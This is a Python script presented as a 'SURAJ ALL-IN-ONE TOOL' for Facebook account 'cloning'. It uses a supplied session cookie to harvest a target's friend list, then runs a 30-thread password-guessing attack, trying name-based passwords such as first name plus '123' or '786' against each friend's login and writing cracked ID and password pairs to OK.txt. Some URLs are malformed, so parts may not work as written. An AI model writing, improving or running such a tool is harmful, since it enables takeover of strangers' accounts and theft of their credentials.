import os, sys, time, json, random, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ज़रूरी लाइब्रेरीज सेटअप
try:
    import requests
    from rich.console import Console
    from rich.panel import Panel
except ImportError:
    os.system('pip install requests rich')
    import requests
    from rich.console import Console
    from rich.panel import Panel

console = Console()
A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'; B = '\x1b[38;5;45m'

def banner():
    os.system('clear')
    console.print(Panel(f"[bold cyan]SURAJ ALL-IN-ONE TOOL[/bold cyan]\n[bold white]Github: Suraj-9[/bold white]\n[bold green]Features: File Make + Cloning[/bold green]", width=50))

class SurajTool:
    def __init__(self):
        self.ids = []
        self.ok = 0; self.cp = 0; self.loop = 0
        self.dump_ids = []

    def menu(self):
        banner()
        print(f"{G}[1] {A}Create File (Dump IDs from Friends)")
        print(f"{G}[2] {A}Start File Cloning")
        print(f"{G}[0] {A}Exit")
        opt = input(f"\n{B}Select Option: {A}")
        if opt == '1': self.make_file()
        elif opt == '2': self.file_input()
        else: exit()

    # --- फाइल बनाने का हिस्सा ---
    def make_file(self):
        banner()
        print(f"{R}Note: You need Facebook Token/Cookie for Dumping")
        cookie = input(f"{B}Enter Your FB Cookie: {A}")
        user_id = input(f"{B}Enter Target ID: {A}")
        try:
            data = requests.get(f"https://facebook.com{user_id}/friends?access_token=YOUR_TOKEN", cookies={'cookie': cookie}).json()
            filename = input(f"{B}Enter File Name to Save (e.g. suraj.txt): {A}")
            with open(filename, 'a') as f:
                for friend in data['data']:
                    f.write(f"{friend['id']}|{friend['name']}\n")
            print(f"{G}Success! IDs saved in {filename}")
            time.sleep(2); self.menu()
        except:
            print(f"{R}Error! Invalid Cookie or ID Privacy."); time.sleep(2); self.menu()

    # --- क्लोनिंग का हिस्सा ---
    def file_input(self):
        banner()
        file = input(f"{B}Enter File Path: {A}")
        try:
            for line in open(file, 'r').readlines():
                self.ids.append(line.strip())
            self.start_cloning()
        except FileNotFoundError:
            print(f"{R}File Not Found!"); time.sleep(2); self.menu()

    def start_cloning(self):
        banner()
        print(f"{G}Cloning Started... Results in OK.txt")
        print(f"{A}------------------------------------------")
        with ThreadPool(max_workers=30) as pool:
            for user in self.ids:
                try:
                    uid, name = user.split('|')
                    first = name.split(' ')[0].lower()
                    ps_list = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'786']
                    pool.submit(self.crack, uid, ps_list)
                except: pass
        print(f"\n{A}------------------------------------------")
        print(f"{G}Finished! OK: {self.ok}")

    def crack(self, uid, ps_list):
        session = requests.Session()
        for pw in ps_list:
            try:
                ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36"
                free_fb = session.get(f'https://facebook.com{uid}').text
                log_data = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "uid": uid, "pass": pw, "next": "https://facebook.com"
                }
                post = session.post('https://facebook.com', data=log_data, headers={'user-agent': ua}, allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f'\r{G}[SURAJ-OK] {uid} | {pw}{A}')
                    open('OK.txt', 'a').write(f'{uid}|{pw}\n')
                    self.ok += 1; break
                elif 'checkpoint' in session.cookies.get_dict():
                    self.cp += 1; break
            except: pass
        self.loop += 1
        sys.stdout.write(f'\r{A}[SURAJ] {self.loop}/{len(self.ids)} {G}OK:{self.ok}'); sys.stdout.flush()

if __name__ == "__main__":
    SurajTool().menu()
  
